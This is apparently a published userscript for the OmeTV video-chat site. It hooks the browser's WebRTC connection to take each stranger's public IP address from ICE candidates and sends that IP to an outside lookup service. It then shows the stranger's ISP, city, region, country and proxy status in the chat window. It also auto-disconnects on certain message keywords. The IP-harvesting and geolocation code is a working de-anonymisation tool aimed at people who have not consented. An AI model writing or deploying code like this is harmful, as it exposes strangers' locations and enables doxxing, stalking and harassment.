// ==UserScript==
// @name         OmeTV
// @namespace    OmeTV Beta
// @version      1
// @license      MIT
// @description  IP
// @author       EmersonxD
// @match        https://ome.tv/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/503900/OmeTV.user.js
// @updateURL https://update.greasyfork.org/scripts/503900/OmeTV.meta.js
// ==/UserScript==
 
 (function() {
  'use strict';

  window.oRTCPeerConnection = window.oRTCPeerConnection || window.RTCPeerConnection;
  window.RTCPeerConnection = function(...args) {
    document.querySelector('.video-container').removeChild(document.querySelector('.ome-tv-logo'));
    const pc = new window.oRTCPeerConnection(...args);
    pc.oaddIceCandidate = pc.addIceCandidate;
    pc.addIceCandidate = function(iceCandidate, ...rest) {
      const fields = iceCandidate.candidate.split(' ');
      if (fields[7] === 'srflx') {
        let list = document.querySelector('.chat-log');
        let req = new XMLHttpRequest();
        req.onreadystatechange = function() {
          if (this.readyState == 4 && this.status == 200) {
            let obj = JSON.parse(this.responseText);
            list.innerHTML += `IP: ${fields[4]}, ${(obj.proxy ? 'proxy' : 'not proxy')}<br/>Provider: ${obj.isp}<br/>Region: ${obj.city}, ${obj.regionName}<br/>Country: ${obj.country}<br/>`;
          }
        };
        req.open('GET', 'https://ip.madhouselabs.net/json/' + fields[4] + '?fields=country,regionName,city,proxy,isp', true);
        req.onerror = function() {
          list.innerHTML += 'Error, ask Sova#5099<br/>';
        };
        req.send();
      }
      return pc.oaddIceCandidate(iceCandidate, ...rest);
    };
    return pc;
  };

  document.addEventListener('DOMSubtreeModified', function(e) {
    if (!e.target.classList.contains('message')) return;
    let msg = e.target.textContent.replace('Stranger: ', '');
    if (msg.match(new RegExp('^([mf]\\b|[mf]\\d)|\\b(dm|snap|subscribe|follow)\\b', 'gi'))) {
      let dc = document.querySelector('.disconnect-btn');
      if (dc.textContent === 'Stop\nEsc') dc.click();
      if (dc.textContent === 'Really?\nEsc') dc.click();
    }
  }, false);
})();